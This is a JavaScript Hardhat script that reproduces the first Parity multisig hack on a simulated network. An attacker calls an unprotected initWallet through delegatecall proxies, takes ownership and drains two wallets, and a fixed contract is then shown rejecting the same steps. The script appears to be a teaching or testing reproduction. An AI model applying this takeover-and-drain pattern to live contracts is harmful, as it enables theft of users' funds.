import { ethers } from "ethers";
import { artifact, assertEqual, assertOk, balance, deploy, eth, expectRevert, fmt, runtime, withLog } from "./lib.js";

await withLog("logs/parity1_attack.log", async () => {
  console.log("# Parity Hack #1 / Unauthorized Initialization");
  console.log("Network: Hardhat in-memory simulated network only. No live RPC or wallet used.");

  const { provider, signers } = await runtime();
  const [deployer, owner, attacker] = signers;
  const attackerAddress = await attacker.getAddress();
  const ownerAddress = await owner.getAddress();

  const lib = await deploy("WalletLibraryVulnerable", deployer);
  console.log(`WalletLibraryVulnerable: ${await lib.getAddress()}`);
  console.log("Deploying three WalletVulnerable proxies that delegatecall to the same library: Wallet 1 is the legitimate-control wallet; Wallets 2 and 3 are exploited.");

  const wallet1 = await deploy("WalletVulnerable", deployer, [await lib.getAddress()], { value: eth(5) });
  const wallet2 = await deploy("WalletVulnerable", deployer, [await lib.getAddress()], { value: eth(5) });
  const wallet3 = await deploy("WalletVulnerable", deployer, [await lib.getAddress()], { value: eth(5) });
  const vulnerableAbi = artifact("WalletLibraryVulnerable").abi;

  const wallet1AsOwner = new ethers.Contract(await wallet1.getAddress(), vulnerableAbi, owner);
  const wallet2AsAttacker = new ethers.Contract(await wallet2.getAddress(), vulnerableAbi, attacker);
  const wallet3AsAttacker = new ethers.Contract(await wallet3.getAddress(), vulnerableAbi, attacker);

  console.log("\n## Wallet 1: legitimate initialization control");
  console.log(`Wallet 1 proxy: ${await wallet1.getAddress()}`);
  console.log(`Wallet 1 balance before init: ${fmt(await balance(provider, await wallet1.getAddress()))}`);
  await (await wallet1AsOwner.initWallet([ownerAddress], 1)).wait();
  console.log(`Owner is owner after legitimate initWallet: ${await wallet1AsOwner.isOwner(ownerAddress)}`);
  assertOk(await wallet1AsOwner.isOwner(ownerAddress), "Wallet 1 legitimate owner is initialized");
  await (await wallet1AsOwner.execute(ownerAddress, eth(1))).wait();
  const wallet1After = await balance(provider, await wallet1.getAddress());
  console.log(`Wallet 1 balance after legitimate owner execute(1 ETH): ${fmt(wallet1After)}`);
  assertEqual(wallet1After, eth(4), "Wallet 1 remains under legitimate owner control after one normal withdrawal", fmt);

  async function exploitWallet(label, wallet, walletAsAttacker) {
    const walletAddress = await wallet.getAddress();
    console.log(`\n## ${label}: attacker initialization and drain`);
    console.log(`${label} proxy: ${walletAddress}`);
    console.log(`${label} balance before exploit: ${fmt(await balance(provider, walletAddress))}`);
    console.log(`Attacker is owner before initWallet: ${await walletAsAttacker.isOwner(attackerAddress)}`);
    await (await walletAsAttacker.initWallet([attackerAddress], 1)).wait();
    console.log(`Attacker is owner after unauthorized initWallet: ${await walletAsAttacker.isOwner(attackerAddress)}`);
    assertOk(await walletAsAttacker.isOwner(attackerAddress), `${label} attacker became owner through unauthorized initWallet`);
    const walletBalance = await balance(provider, walletAddress);
    await (await walletAsAttacker.execute(attackerAddress, walletBalance)).wait();
    const walletAfter = await balance(provider, walletAddress);
    console.log(`${label} balance after attacker execute(): ${fmt(walletAfter)}`);
    assertEqual(walletAfter, 0n, `${label} drained by attacker`, fmt);
  }

  await exploitWallet("Wallet 2", wallet2, wallet2AsAttacker);
  await exploitWallet("Wallet 3", wallet3, wallet3AsAttacker);
  console.log("\nResult: uninitialized proxy storage let the attacker become owner of Wallet 2 and Wallet 3, then drain both wallets.");

  console.log("\n## Fixed wallet check");
  const fixed = await deploy("WalletFixed", deployer, [[ownerAddress], 1], { value: eth(5) });
  console.log(`WalletFixed: ${await fixed.getAddress()}`);
  console.log(`Fixed wallet balance before attack attempt: ${fmt(await balance(provider, await fixed.getAddress()))}`);
  await expectRevert("attacker cannot re-run initWallet", async () =>
    fixed.connect(attacker).initWallet([attackerAddress], 1)
  );
  await expectRevert("attacker cannot execute from fixed wallet", async () =>
    fixed.connect(attacker).execute(attackerAddress, eth(1))
  );
  const fixedAfter = await balance(provider, await fixed.getAddress());
  console.log(`Fixed wallet balance after attack attempt: ${fmt(fixedAfter)}`);
  assertEqual(fixedAfter, eth(5), "fixed wallet balance remains protected after attacker attempts", fmt);
});
